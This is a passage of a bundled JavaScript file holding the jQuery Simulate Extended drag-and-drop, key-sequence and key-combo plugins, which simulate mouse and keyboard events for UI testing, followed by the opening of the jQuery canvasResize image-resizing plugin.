		 * @requires lastTime
		 * @requires stepDelay
		 * @requires step
		 * @requires ele
		 * @requires eventTarget
		 * @reuiqre targetDoc
		 * @requires start
		 * @requires drag
		 * @requires now()
		 * @inner
		 * @author julrich
		 * @since 1.0
		 */
		function stepAndSleep() {
			var timeElapsed = now() - lastTime; // Work-around for Firefox & IE "bug": setTimeout can fire before the timeout
			if (timeElapsed >= stepDelay) {
				if (step < stepCount) {
					interpolationStep();
					step += 1;
					lastTime = now();
					setTimeout(stepAndSleep, stepDelay);
				}
				else {
					var pageCoord = {pageX: Math.round(start.x+drag.dx), pageY: Math.round(start.y+drag.dy)},
						clientCoord = pageToClientPos(pageCoord, targetDoc),
						eventTarget = elementAtPosition(clientCoord, targetDoc) || ele;
					self.simulateEvent( eventTarget, "mousemove", pageCoord);
					dragFinished(ele, options);
				}
			}
			else {
				setTimeout(stepAndSleep, stepDelay - timeElapsed);
			}

		}

		if ( (!interpolOptions.stepDelay && !interpolOptions.duration) || ((interpolOptions.stepDelay <= 0) && (interpolOptions.duration <= 0)) ) {
			// Trigger as fast as possible
			for (var i=0; i < stepCount; i+=1) {
				interpolationStep();
			}
			var pageCoord = {pageX: Math.round(start.x+drag.dx), pageY: Math.round(start.y+drag.dy)},
				clientCoord = pageToClientPos(pageCoord, targetDoc),
				eventTarget = elementAtPosition(clientCoord, targetDoc) || ele;
			self.simulateEvent( eventTarget, "mousemove", pageCoord);
			dragFinished(ele, options);
		}
		else {
			var stepDelay = parseInt(interpolOptions.stepDelay,10) || Math.ceil(parseInt(interpolOptions.duration,10) / (stepCount+1));
			var step = 0;

			lastTime = now();
			setTimeout(stepAndSleep, stepDelay);
		}

	}

	/**
	 * @returns {Object|undefined} an object containing information about the currently active drag
	 * or <code>undefined</code> when there is no active drag.
	 * The returned object contains the following properties:
	 * <ul>
	 *     <li><code>dragElement</code>: the dragged element</li>
	 *     <li><code>dragStart</code>: object with the properties <code>x</code> and <code>y</code>
	 * representing the page relative start coordinates of the drag</li>
	 *     <li><code>dragDistance</code>: object with the properties <code>x</code> and <code>y</code>
	 * representing the distance of the drag in x and y direction</li>
	 * </ul>
	 * @public
	 * @author julrich
	 * @since 1.0
	 */
	$.simulate.activeDrag = function() {
		if (!$.simulate._activeDrag) {
			return undefined;
		}
		return $.extend(true,{},$.simulate._activeDrag);
	};

	$.extend( $.simulate.prototype,

	/**
	 * @lends $.simulate.prototype
	 */
	{


		/**
		 * Simulates a drag.
		 *
		 * @see https://github.com/j-ulrich/jquery-simulate-ext/blob/master/doc/drag-n-drop.md
		 * @public
		 * @author julrich
		 * @since 1.0
		 */
		simulateDrag: function() {
			var self = this,
				ele = self.target,
				options = $.extend({
					dx: 0,
					dy: 0,
					dragTarget: undefined,
					clickToDrag: false,
					eventProps: {},
					interpolation: {
						stepWidth: 0,
						stepCount: 0,
						stepDelay: 0,
						duration: 0,
						shaky: false
					},
					callback: undefined
				},	this.options);

			var start,
				continueDrag = ($.simulate._activeDrag && $.simulate._activeDrag.dragElement === ele);

			if (continueDrag) {
				start = $.simulate._activeDrag.dragStart;
			}
			else {
				start = findCenter( ele );
			}

			var x = Math.round( start.x ),
				y = Math.round( start.y ),
				coord = { pageX: x, pageY: y },
				dx,
				dy;

			if (options.dragTarget) {
				var end = findCenter(options.dragTarget);
				dx = Math.round(end.x - start.x);
				dy = Math.round(end.y - start.y);
			}
			else {
				dx = options.dx || 0;
				dy = options.dy || 0;
			}

			if (continueDrag) {
				// We just continue to move the dragged element
				$.simulate._activeDrag.dragDistance.x += dx;
				$.simulate._activeDrag.dragDistance.y += dy;
				coord = { pageX: Math.round(x + $.simulate._activeDrag.dragDistance.x) , pageY: Math.round(y + $.simulate._activeDrag.dragDistance.y) };
			}
			else {
				if ($.simulate._activeDrag) {
					// Drop before starting a new drag
					$($.simulate._activeDrag.dragElement).simulate( "drop" );
				}

				// We start a new drag
				$.extend(options.eventProps, coord);
				self.simulateEvent( ele, "mousedown", options.eventProps );
				if (options.clickToDrag === true) {
					self.simulateEvent( ele, "mouseup", options.eventProps );
					self.simulateEvent( ele, "click", options.eventProps );
				}
				$(ele).add(ele.ownerDocument).one('mouseup', function() {
					$.simulate._activeDrag = undefined;
				});

				$.extend($.simulate, {
					_activeDrag: {
						dragElement: ele,
						dragStart: { x: x, y: y },
						dragDistance: { x: dx, y: dy }
					}
				});
				coord = { pageX: Math.round(x + dx), pageY: Math.round(y + dy) };
			}

			if (dx !== 0 || dy !== 0) {

				if ( options.interpolation && (options.interpolation.stepCount || options.interpolation.stepWidth) ) {
					interpolatedEvents(self, ele, {x: x, y: y}, {dx: dx, dy: dy}, options);
				}
				else {
					var targetDoc = selectFirstMatch([ele, ele.ownerDocument], isDocument) || document,
						clientCoord = pageToClientPos(coord, targetDoc),
						eventTarget = elementAtPosition(clientCoord, targetDoc) || ele;

					$.extend(options.eventProps, coord);
					self.simulateEvent( eventTarget, "mousemove", options.eventProps );
					dragFinished(ele, options);
				}
			}
			else {
				dragFinished(ele, options);
			}
		},

		/**
		 * Simulates a drop.
		 *
		 * @see https://github.com/j-ulrich/jquery-simulate-ext/blob/master/doc/drag-n-drop.md
		 * @public
		 * @author julrich
		 * @since 1.0
		 */
		simulateDrop: function() {
			var self = this,
				ele = this.target,
				activeDrag = $.simulate._activeDrag,
				options = $.extend({
					clickToDrop: false,
					eventProps: {},
					callback: undefined
				}, self.options),
				moveBeforeDrop = true,
				center = findCenter( ele ),
				x = Math.round( center.x ),
				y = Math.round( center.y ),
				coord = { pageX: x, pageY: y },
				targetDoc = ( (activeDrag)? selectFirstMatch([activeDrag.dragElement, activeDrag.dragElement.ownerDocument], isDocument) : selectFirstMatch([ele, ele.ownerDocument], isDocument) ) || document,
				clientCoord = pageToClientPos(coord, targetDoc),
				eventTarget = elementAtPosition(clientCoord, targetDoc);

			if (activeDrag && (activeDrag.dragElement === ele || isDocument(ele))) {
				// We already moved the mouse during the drag so we just simulate the drop on the end position
				x = Math.round(activeDrag.dragStart.x + activeDrag.dragDistance.x);
				y = Math.round(activeDrag.dragStart.y + activeDrag.dragDistance.y);
				coord = { pageX: x, pageY: y };
				clientCoord = pageToClientPos(coord, targetDoc);
				eventTarget = elementAtPosition(clientCoord, targetDoc);
				moveBeforeDrop = false;
			}

			if (!eventTarget) {
				eventTarget = (activeDrag)? activeDrag.dragElement : ele;
			}

			$.extend(options.eventProps, coord);

			if (moveBeforeDrop === true) {
				// Else we assume the drop should happen on target, so we move there
				self.simulateEvent( eventTarget, "mousemove", options.eventProps );
			}

			if (options.clickToDrop) {
				self.simulateEvent( eventTarget, "mousedown", options.eventProps );
			}
			this.simulateEvent( eventTarget, "mouseup", options.eventProps );
			if (options.clickToDrop) {
				self.simulateEvent( eventTarget, "click", options.eventProps );
			}

			$.simulate._activeDrag = undefined;
			$(eventTarget).trigger({type: "simulate-drop"});
			if ($.isFunction(options.callback)) {
				options.callback.apply(eventTarget);
			}
		},

		/**
		 * Simulates a drag followed by drop.
		 *
		 * @see https://github.com/j-ulrich/jquery-simulate-ext/blob/master/doc/drag-n-drop.md
		 * @public
		 * @author julrich
		 * @since 1.0
		 */
		simulateDragNDrop: function() {
			var self = this,
				ele = this.target,
				options = $.extend({
					dragTarget: undefined,
					dropTarget: undefined
				}, self.options),
				// If there is a dragTarget or dx/dy, then we drag there and simulate an independent drop on dropTarget or ele
				dropEle = ((options.dragTarget || options.dx || options.dy)? options.dropTarget : ele) || ele;
/*
				dx = (options.dropTarget)? 0 : (options.dx || 0),
				dy = (options.dropTarget)? 0 : (options.dy || 0),
				dragDistance = { dx: dx, dy: dy };

			$.extend(options, dragDistance);
*/
			$(ele).simulate( "drag", $.extend({},options,{
				// If there is no dragTarget, no dx and no dy, we drag onto the dropTarget directly
				dragTarget: options.dragTarget || ((options.dx || options.dy)?undefined:options.dropTarget),
				callback: function() {
					$(dropEle).simulate( "drop", options );
				}
			}));

		}
	});

}(jQuery));




/*jshint camelcase:true, plusplus:true, forin:true, noarg:true, noempty:true, eqeqeq:true, bitwise:true, strict:true, undef:true, unused:true, curly:true, browser:true, devel:true, maxerr:100, white:false, onevar:false */
/*global jQuery:true $:true bililiteRange:true */

/* jQuery Simulate Key-Sequence Plugin 1.3.0
 * http://github.com/j-ulrich/jquery-simulate-ext
 *
 * Copyright (c) 2014 Jochen Ulrich
 * Licensed under the MIT license (MIT-LICENSE.txt).
 *
 * The plugin is an extension and modification of the jQuery sendkeys plugin by Daniel Wachsstock.
 * Therefore, the original copyright notice and license follow below.
 */

// insert characters in a textarea or text input field
// special characters are enclosed in {}; use {{} for the { character itself
// documentation: http://bililite.com/blog/2008/08/20/the-fnsendkeys-plugin/
// Version: 2.0
// Copyright (c) 2010 Daniel Wachsstock
// MIT license:
// Permission is hereby granted, free of charge, to any person
// obtaining a copy of this software and associated documentation
// files (the "Software"), to deal in the Software without
// restriction, including without limitation the rights to use,
// copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the
// Software is furnished to do so, subject to the following
// conditions:
//
// The above copyright notice and this permission notice shall be
// included in all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
// EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
// OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
// NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
// HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
// WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
// FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
// OTHER DEALINGS IN THE SOFTWARE.

;(function($, undefined){
	"use strict";

	$.simulate.prototype.quirks = $.simulate.prototype.quirks || {};

	$.extend($.simulate.prototype.quirks,

	/**
	 * @lends $.simulate.prototype.quirks
	 */
	{
		/**
		 * When simulating with delay in non-input elements,
		 * all spaces are simulated at the end of the sequence instead
		 * of the correct position.
		 * @see {@link https://github.com/j-ulrich/jquery-simulate-ext/issues/6|issues #6}
		 */
		delayedSpacesInNonInputGlitchToEnd: undefined

	});

	$.extend($.simulate.prototype,

	/**
	 * @lends $.simulate.prototype
	 */
	{

		/**
		 * Simulates sequencial key strokes.
		 *
		 * @see https://github.com/j-ulrich/jquery-simulate-ext/blob/master/doc/key-sequence.md
		 * @public
		 * @author Daniel Wachsstock, julrich
		 * @since 1.0
		 */
		simulateKeySequence: function() {
			var target = this.target,
				$target = $(target),
				opts = $.extend({
					sequence: "",
					triggerKeyEvents: true,
					eventProps: {},
					delay: 0,
					callback: undefined
				}, this.options),
				sequence = opts.sequence;

			opts.delay = parseInt(opts.delay,10);

			var localkeys = {};

			// Fix for #6 (https://github.com/j-ulrich/jquery-simulate-ext/issues/6)
			if ($.simulate.prototype.quirks.delayedSpacesInNonInputGlitchToEnd && !$target.is('input,textarea')) {
				$.extend(localkeys, {
					' ': function(rng, s, opts) {
						var internalOpts = $.extend({}, opts, {
							triggerKeyEvents: false,
							delay: 0,
							callback: undefined
						});
						$.simulate.prototype.simulateKeySequence.defaults.simplechar(rng, '\xA0', internalOpts);
						$.simulate.prototype.simulateKeySequence.defaults['{leftarrow}'](rng, s, internalOpts);
						$.simulate.prototype.simulateKeySequence.defaults.simplechar(rng, s, opts);
						$.simulate.prototype.simulateKeySequence.defaults['{del}'](rng, s, internalOpts);
					}
				});
			}

			$.extend(localkeys, opts, $target.data('simulate-keySequence')); // allow for element-specific key functions

			// most elements to not keep track of their selection when they lose focus, so we have to do it for them
			var rng = $.data (target, 'simulate-keySequence.selection');
			if (!rng){
				rng = bililiteRange(target).bounds('selection');
				$.data(target, 'simulate-keySequence.selection', rng);
				$target.bind('mouseup.simulate-keySequence', function(){
					// we have to update the saved range. The routines here update the bounds with each press, but actual keypresses and mouseclicks do not
					$.data(target, 'simulate-keySequence.selection').bounds('selection');
				}).bind('keyup.simulate-keySequence', function(evt){
					// restore the selection if we got here with a tab (a click should select what was clicked on)
					if (evt.which === 9){
						// there's a flash of selection when we restore the focus, but I don't know how to avoid that.
						$.data(target, 'simulate-keySequence.selection').select();
					}else{
						$.data(target, 'simulate-keySequence.selection').bounds('selection');
					}
				});
			}
			$target.focus();
			if (typeof sequence === 'undefined') { // no string, so we just set up the event handlers
				return;
			}
			sequence = sequence.replace(/\n/g, '{enter}'); // turn line feeds into explicit break insertions

			/**
			 * Informs the rest of the world that the sequences is finished.
			 * @fires simulate-keySequence
			 * @requires target
			 * @requires sequence
			 * @requires opts
			 * @inner
			 * @author julrich
			 * @since 1.0
			 */
			function sequenceFinished() {
				$target.trigger({type: 'simulate-keySequence', sequence: sequence});
				if ($.isFunction(opts.callback)) {
					opts.callback.apply(target, [{
						sequence: sequence
					}]);
				}
			}

			/**
			 * Simulates the key stroke for one character (or special sequence) and sleeps for
			 * <code>opts.delay</code> milliseconds.
			 * @requires lastTime
			 * @requires now()
			 * @requires tokenRegExp
			 * @requires opts
			 * @requires rng
			 * @inner
			 * @author julrich
			 * @since 1.0
			 */
			function processNextToken() {
				var timeElapsed = now() - lastTime; // Work-around for Firefox "bug": setTimeout can fire before the timeout
				if (timeElapsed >= opts.delay) {
					var match = tokenRegExp.exec(sequence);
					if ( match !== null ) {
						var s = match[0];
						(localkeys[s] || $.simulate.prototype.simulateKeySequence.defaults[s] || $.simulate.prototype.simulateKeySequence.defaults.simplechar)(rng, s, opts);
						setTimeout(processNextToken, opts.delay);
					}
					else {
						sequenceFinished();
					}
					lastTime = now();
				}
				else {
					setTimeout(processNextToken, opts.delay - timeElapsed);
				}
			}

			if (!opts.delay || opts.delay <= 0) {
				// Run as fast as possible
				sequence.replace(/\{[^}]*\}|[^{]+/g, function(s){
					(localkeys[s] || $.simulate.prototype.simulateKeySequence.defaults[s] || $.simulate.prototype.simulateKeySequence.defaults.simplechar)(rng, s, opts);
				});
				sequenceFinished();
			}
			else {
				var tokenRegExp = /\{[^}]*\}|[^{]/g; // This matches curly bracket expressions or single characters
				var now = Date.now || function() { return new Date().getTime(); },
					lastTime = now();

				processNextToken();
			}

		}
	});

	$.extend($.simulate.prototype.simulateKeySequence.prototype,

	/**
	 * @lends $.simulate.prototype.simulateKeySequence.prototype
	 */
	{

			/**
			 * Maps special character char codes to IE key codes (covers IE and Webkit)
			 * @author julrich
			 * @since 1.0
			 */
			IEKeyCodeTable: {
				33: 49,	// ! -> 1
				64: 50,	// @ -> 2
				35: 51,	// # -> 3
				36: 52,	// $ -> 4
				37: 53,	// % -> 5
				94: 54,	// ^ -> 6
				38: 55,	// & -> 7
				42: 56,	// * -> 8
				40: 57,	// ( -> 9
				41: 48,	// ) -> 0

				59: 186,	// ; -> 186
				58: 186,	// : -> 186
				61: 187,	// = -> 187
				43: 187,	// + -> 187
				44: 188,	// , -> 188
				60: 188,	// < -> 188
				45: 189,	// - -> 189
				95: 189,	// _ -> 189
				46: 190,	// . -> 190
				62: 190,	// > -> 190
				47: 191,	// / -> 191
				63: 191,	// ? -> 191
				96: 192,	// ` -> 192
				126: 192,	// ~ -> 192
				91: 219,	// [ -> 219
				123: 219,	// { -> 219
				92: 220,	// \ -> 220
				124: 220,	// | -> 220
				93: 221,	// ] -> 221
				125: 221,	// } -> 221
				39: 222,	// ' -> 222
				34: 222		// " -> 222
			},

			/**
			 * Tries to convert character codes to key codes.
			 * @param {Numeric} character - A character code
			 * @returns {Numeric} The key code corresponding to the given character code,
			 * based on the key code table of InternetExplorer. If no corresponding key code
			 * could be found (which will be the case for all special characters except the common
			 * ones), the character code itself is returned. However, <code>keyCode === charCode</code>
			 * does not imply that no key code was found because some key codes are identical to the
			 * character codes (e.g. for uppercase characters).
			 * @requires $.simulate.prototype.simulateKeySequence.prototype.IEKeyCodeTable
			 * @see $.simulate.prototype.simulateKeySequence.prototype.IEKeyCodeTable
			 * @author julrich
			 * @since 1.0
			 */
			charToKeyCode: function(character) {
				var specialKeyCodeTable = $.simulate.prototype.simulateKeySequence.prototype.IEKeyCodeTable;
				var charCode = character.charCodeAt(0);

				if (charCode >= 64 && charCode <= 90 || charCode >= 48 && charCode <= 57) {
					// A-Z and 0-9
					return charCode;
				}
				else if (charCode >= 97 && charCode <= 122) {
					// a-z -> A-Z
					return character.toUpperCase().charCodeAt(0);
				}
				else if (specialKeyCodeTable[charCode] !== undefined) {
					return specialKeyCodeTable[charCode];
				}
				else {
					return charCode;
				}
			}
	});

	// add the functions publicly so they can be overridden
	$.simulate.prototype.simulateKeySequence.defaults = {

		/**
		 * Simulates key strokes of "normal" characters (i.e. non-special sequences).
		 * @param {Object} rng - bililiteRange object of the simulation target element.
		 * @param {String} s - String of (simple) characters to be simulated.
		 * @param {Object} opts - The key-sequence options.
		 * @author Daniel Wachsstock, julrich
		 * @since 1.0
		 */
		simplechar: function (rng, s, opts){
			rng.text(s, 'end');
			if (opts.triggerKeyEvents) {
				for (var i =0; i < s.length; i += 1){
					var charCode = s.charCodeAt(i);
					var keyCode = $.simulate.prototype.simulateKeySequence.prototype.charToKeyCode(s.charAt(i));
					// a bit of cheating: rng._el is the element associated with rng.
					$(rng._el).simulate('keydown', $.extend({}, opts.eventProps, {keyCode: keyCode}));
					$(rng._el).simulate('keypress', $.extend({}, opts.eventProps,{keyCode: charCode, which: charCode, charCode: charCode}));
					$(rng._el).simulate('keyup', $.extend({}, opts.eventProps, {keyCode: keyCode}));
				}
			}
		},

		/**
		 * Simulates key strokes of a curly opening bracket.
		 * @param {Object} rng - bililiteRange object of the simulation target element.
		 * @param {String} s - Ignored.
		 * @param {Object} opts - The key-sequence options.
		 * @author Daniel Wachsstock, julrich
		 * @since 1.0
		 */
		'{{}': function (rng, s, opts){
			$.simulate.prototype.simulateKeySequence.defaults.simplechar(rng, '{', opts);
		},

		/**
		 * Simulates hitting the enter button.
		 * @param {Object} rng - bililiteRange object of the simulation target element.
		 * @param {String} s - Ignored.
		 * @param {Object} opts - The key-sequence options.
		 * @author Daniel Wachsstock, julrich
		 * @since 1.0
		 */
		'{enter}': function (rng, s, opts){
			rng.insertEOL();
			rng.select();
			if (opts.triggerKeyEvents === true) {
				$(rng._el).simulate('keydown', $.extend({}, opts.eventProps, {keyCode: 13}));
				$(rng._el).simulate('keypress', $.extend({}, opts.eventProps, {keyCode: 13, which: 13, charCode: 13}));
				$(rng._el).simulate('keyup', $.extend({}, opts.eventProps, {keyCode: 13}));
			}
		},

		/**
		 * Simulates hitting the backspace button.
		 * @param {Object} rng - bililiteRange object of the simulation target element.
		 * @param {String} s - Ignored.
		 * @param {Object} opts - The key-sequence options.
		 * @author Daniel Wachsstock, julrich
		 * @since 1.0
		 */
		'{backspace}': function (rng, s, opts){
			var b = rng.bounds();
			if (b[0] === b[1]) { rng.bounds([b[0]-1, b[0]]); } // no characters selected; it's just an insertion point. Remove the previous character
			rng.text('', 'end'); // delete the characters and update the selection
			if (opts.triggerKeyEvents === true) {
				$(rng._el).simulate('keydown', $.extend({}, opts.eventProps, {keyCode: 8}));
				$(rng._el).simulate('keyup', $.extend({}, opts.eventProps, {keyCode: 8}));
			}
		},

		/**
		 * Simulates hitting the delete button.
		 * @param {Object} rng - bililiteRange object of the simulation target element.
		 * @param {String} s - Ignored.
		 * @param {Object} opts - The key-sequence options.
		 * @author Daniel Wachsstock, julrich
		 * @since 1.0
		 */
		'{del}': function (rng, s, opts){
			var b = rng.bounds();
			if (b[0] === b[1]) { rng.bounds([b[0], b[0]+1]); } // no characters selected; it's just an insertion point. Remove the next character
			rng.text('', 'end'); // delete the characters and update the selection
			if (opts.triggerKeyEvents === true) {
				$(rng._el).simulate('keydown', $.extend({}, opts.eventProps, {keyCode: 46}));
				$(rng._el).simulate('keyup', $.extend({}, opts.eventProps, {keyCode: 46}));
			}
		},

		/**
		 * Simulates hitting the right arrow button.
		 * @param {Object} rng - bililiteRange object of the simulation target element.
		 * @param {String} s - Ignored.
		 * @param {Object} opts - The key-sequence options.
		 * @author Daniel Wachsstock, julrich
		 * @since 1.0
		 */
		'{rightarrow}':  function (rng, s, opts){
			var b = rng.bounds();
			if (b[0] === b[1]) { b[1] += 1; } // no characters selected; it's just an insertion point. Move to the right
			rng.bounds([b[1], b[1]]).select();
			if (opts.triggerKeyEvents === true) {
				$(rng._el).simulate('keydown', $.extend({}, opts.eventProps, {keyCode: 39}));
				$(rng._el).simulate('keyup', $.extend({}, opts.eventProps, {keyCode: 39}));
			}
		},

		/**
		 * Simulates hitting the left arrow button.
		 * @param {Object} rng - bililiteRange object of the simulation target element.
		 * @param {String} s - Ignored.
		 * @param {Object} opts - The key-sequence options.
		 * @author Daniel Wachsstock, julrich
		 * @since 1.0
		 */
		'{leftarrow}': function (rng, s, opts){
			var b = rng.bounds();
			if (b[0] === b[1]) { b[0] -= 1; } // no characters selected; it's just an insertion point. Move to the left
			rng.bounds([b[0], b[0]]).select();
			if (opts.triggerKeyEvents === true) {
				$(rng._el).simulate('keydown', $.extend({}, opts.eventProps, {keyCode: 37}));
				$(rng._el).simulate('keyup', $.extend({}, opts.eventProps, {keyCode: 37}));
			}
		},

		/**
		 * Selects all characters in the target element.
		 * @param {Object} rng - bililiteRange object of the simulation target element.
		 * @author Daniel Wachsstock, julrich
		 * @since 1.0
		 */
		'{selectall}' : function (rng){
			rng.bounds('all').select();
		}
	};




	//####### Quirk detection #######
	if ($.simulate.ext_disableQuirkDetection !== true) { // Fixes issue #9 (https://github.com/j-ulrich/jquery-simulate-ext/issues/9)
		$(document).ready(function() {
			// delayedSpacesInNonInputGlitchToEnd
			// See issues #6 (https://github.com/j-ulrich/jquery-simulate-ext/issues/6)
			/* Append a div to the document (bililiteRange needs the element to be in the document), simulate
			 * a delayed sequence containing a space in the middle and check if the space moves to the end.
			 */
			var $testDiv = $('<div/>').css({height: 1, width: 1, position: 'absolute', left: -1000, top: -1000}).appendTo('body');
			$testDiv.simulate('key-sequence', {sequence: '\xA0 \xA0', delay:1, callback: function() {
				$.simulate.prototype.quirks.delayedSpacesInNonInputGlitchToEnd = ($testDiv.text() === '\xA0\xA0 ');
				$testDiv.remove();
			}});
		});
	}

})(jQuery);




/*jshint camelcase:true, plusplus:true, forin:true, noarg:true, noempty:true, eqeqeq:true, bitwise:true, strict:true, undef:true, unused:true, curly:true, browser:true, devel:true, maxerr:100, white:false, onevar:false */
/*global jQuery:true $:true */

/* jQuery Simulate Key-Combo Plugin 1.3.0
 * http://github.com/j-ulrich/jquery-simulate-ext
 *
 * Copyright (c) 2014 Jochen Ulrich
 * Licensed under the MIT license (MIT-LICENSE.txt).
 */

/**
 *
 * For details about key events, key codes, char codes etc. see http://unixpapa.com/js/key.html
 */

;(function($,undefined) {
	"use strict";

	/**
	 * Key codes of special keys.
	 * @private
	 * @author julrich
	 * @since 1.3.0
	 */
	var SpecialKeyCodes = {
		// Modifier Keys
		SHIFT:			16,
		CONTROL:		17,
		ALTERNATIVE:	18,
		META:			91,
		// Arrow Keys
		LEFT_ARROW:		37,
		UP_ARROW:		38,
		RIGHT_ARROW:	39,
		DOWN_ARROW:		40,
		// Function Keys
		F1:				112,
		F2:				113,
		F3:				114,
		F4:				115,
		F5:				116,
		F6:				117,
		F7:				118,
		F8:				119,
		F9:				120,
		F10:			121,
		F11:			122,
		F12:			123,
		// Other
		ENTER:			13,
		TABULATOR:		9,
		ESCAPE:			27,
		BACKSPACE:		8,
		INSERT:			45,
		DELETE:			46,
		HOME:			36,
		END:			35,
		PAGE_UP:		33,
		PAGE_DOWN:		34,

	};

	// SpecialKeyCode aliases
	SpecialKeyCodes.CTRL	= SpecialKeyCodes.CONTROL;
	SpecialKeyCodes.ALT		= SpecialKeyCodes.ALTERNATIVE;
	SpecialKeyCodes.COMMAND	= SpecialKeyCodes.META;
	SpecialKeyCodes.TAB		= SpecialKeyCodes.TABULATOR;
	SpecialKeyCodes.ESC		= SpecialKeyCodes.ESCAPE;


	$.extend( $.simulate.prototype,

	/**
	 * @lends $.simulate.prototype
	 */
	{


		/**
		 * Simulates simultaneous key presses
		 *
		 * @see https://github.com/j-ulrich/jquery-simulate-ext/blob/master/doc/key-combo.md
		 * @public
		 * @author julrich
		 * @since 1.0
		 */
		simulateKeyCombo: function() {
			var $target = $(this.target),
				options = $.extend({
					combo: "",
					eventProps: {},
					eventsOnly: false
				}, this.options),
				combo = options.combo,
				comboSplit = combo.split(/(\+)/),
				plusExpected = false,
				holdKeys = [],
				i;

			if (combo.length === 0) {
				return;
			}

			// Remove empty parts
			comboSplit = $.grep(comboSplit, function(part) {
				return (part !== "");
			});

			for (i=0; i < comboSplit.length; i+=1) {
				var key = comboSplit[i],
					keyLowered = key.toLowerCase(),
					keySpecial = key.toUpperCase().replace('-','_');

				if (plusExpected) {
					if (key !== "+") {
						throw 'Syntax error: expected "+"';
					}
					else {
						plusExpected = false;
					}
				}
				else {
					var keyCode;
					if ( key.length > 1) {
						// Assume a special key
						keyCode = SpecialKeyCodes[keySpecial];

						if (keyCode === undefined) {
							throw 'Syntax error: unknown special key "'+key+'" (forgot "+" between keys?)';
						}

						switch (keyCode) {
						case SpecialKeyCodes.CONTROL:
						case SpecialKeyCodes.ALT:
						case SpecialKeyCodes.SHIFT:
						case SpecialKeyCodes.META:
							options.eventProps[keyLowered+"Key"] = true;
							break;
						}
						holdKeys.unshift(keyCode);
						options.eventProps.keyCode = keyCode;
						options.eventProps.which = keyCode;
						options.eventProps.charCode = 0;
						$target.simulate("keydown", options.eventProps);

					}
					else {
						// "Normal" key
						keyCode = $.simulate.prototype.simulateKeySequence.prototype.charToKeyCode(key);
						holdKeys.unshift(keyCode);
						options.eventProps.keyCode = keyCode;
						options.eventProps.which = keyCode;
						options.eventProps.charCode = undefined;
						$target.simulate("keydown", options.eventProps);
						if (options.eventProps.shiftKey) {
							key = key.toUpperCase();
						}
						options.eventProps.keyCode = key.charCodeAt(0);
						options.eventProps.charCode = options.eventProps.keyCode;
						options.eventProps.which = options.eventProps.keyCode;
						$target.simulate("keypress", options.eventProps);
						if (options.eventsOnly !== true && !options.eventProps.ctrlKey && !options.eventProps.altKey && !options.eventProps.metaKey) {
							$target.simulate('key-sequence', {sequence: key, triggerKeyEvents: false});
						}
					}

					plusExpected = true;
				}
			}

			if (!plusExpected) {
				throw 'Syntax error: expected key (trailing "+"?)';
			}

			// Release keys
			options.eventProps.charCode = undefined;
			for (i=0; i < holdKeys.length; i+=1) {
				options.eventProps.keyCode = holdKeys[i];
				options.eventProps.which = holdKeys[i];
				switch (options.eventProps.keyCode) {
				case SpecialKeyCodes.ALT:		options.eventProps.altKey = false; break;
				case SpecialKeyCodes.SHIFT:		options.eventProps.shiftKey = false; break;
				case SpecialKeyCodes.CONTROL:	options.eventProps.ctrlKey = false; break;
				case SpecialKeyCodes.META:		options.eventProps.metaKey = false; break;
				default:
					break;
				}
				$target.simulate("keyup", options.eventProps);
			}
		}

	});
}(jQuery));






/*
 * jQuery canvasResize plugin
 *
 * Version: 1.2.0
 * Date (d/m/y): 02/10/12
 * Update (d/m/y): 14/05/13
 * Original author: @gokercebeci
 * Licensed under the MIT license
 * - This plugin working with jquery.exif.js
 *   (It's under the MPL License http://www.nihilogic.dk/licenses/mpl-license.txt)
 * Demo: http://ios6-image-resize.gokercebeci.com/
 *
 * - I fixed iOS6 Safari's image file rendering issue for large size image (over mega-pixel)
 *   using few functions from https://github.com/stomita/ios-imagefile-megapixel
 *   (detectSubsampling, )
 *   And fixed orientation issue by edited http://blog.nihilogic.dk/2008/05/jquery-exif-data-plugin.html
 *   Thanks, Shinichi Tomita and Jacob Seidelin
 */

(function($) {
    var pluginName = 'canvasResize',
            methods = {
        newsize: function(w, h, W, H, C) {
            var c = C ? 'h' : '';
            if ((W && w > W) || (H && h > H)) {
                var r = w / h;
                if ((r >= 1 || H === 0) && W && !C) {
                    w = W;
                    h = (W / r) >> 0;
                } else if (C && r <= (W / H)) {
                    w = W;
                    h = (W / r) >> 0;
                    c = 'w';
                } else {
                    w = (H * r) >> 0;
                    h = H;
                }
            }
            return {
                'width': w,
                'height': h,
                'cropped': c
            };
        },
        dataURLtoBlob: function(data) {
            var mimeString = data.split(',')[0].split(':')[1].split(';')[0];
            var byteString = atob(data.split(',')[1]);
            var ab = new ArrayBuffer(byteString.length);
            var ia = new Uint8Array(ab);
            for (var i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            var bb = (window.BlobBuilder || window.WebKitBlobBuilder || window.MozBlobBuilder);
            if (bb) {
                //    console.log('BlobBuilder');
                bb = new (window.BlobBuilder || window.WebKitBlobBuilder || window.MozBlobBuilder)();
                bb.append(ab);
                return bb.getBlob(mimeString);
            } else {
                //    console.log('Blob');
                bb = new Blob([ab], {
                    'type': (mimeString)
                });
                return bb;
            }
        },
        /**
         * Detect subsampling in loaded image.
         * In iOS, larger images than 2M pixels may be subsampled in rendering.
         */
        detectSubsampling: function(img) {
            var iw = img.width, ih = img.height;
            if (iw * ih > 1048576) { // subsampling may happen over megapixel image
                var canvas = document.createElement('canvas');
                canvas.width = canvas.height = 1;
                var ctx = canvas.getContext('2d');
                ctx.drawImage(img, -iw + 1, 0);
                // subsampled image becomes half smaller in rendering size.
                // check alpha channel value to confirm image is covering edge pixel or not.
                // if alpha value is 0 image is not covering, hence subsampled.
                return ctx.getImageData(0, 0, 1, 1).data[3] === 0;
            } else {
                return false;
            }
        },
        /**
         * Update the orientation according to the specified rotation angle
         */
        rotate: function(orientation, angle) {
            var o = {
                // nothing
                1: {90: 6, 180: 3, 270: 8},
                // horizontal flip
                2: {90: 7, 180: 4, 270: 5},
                // 180 rotate left
                3: {90: 8, 180: 1, 270: 6},
                // vertical flip
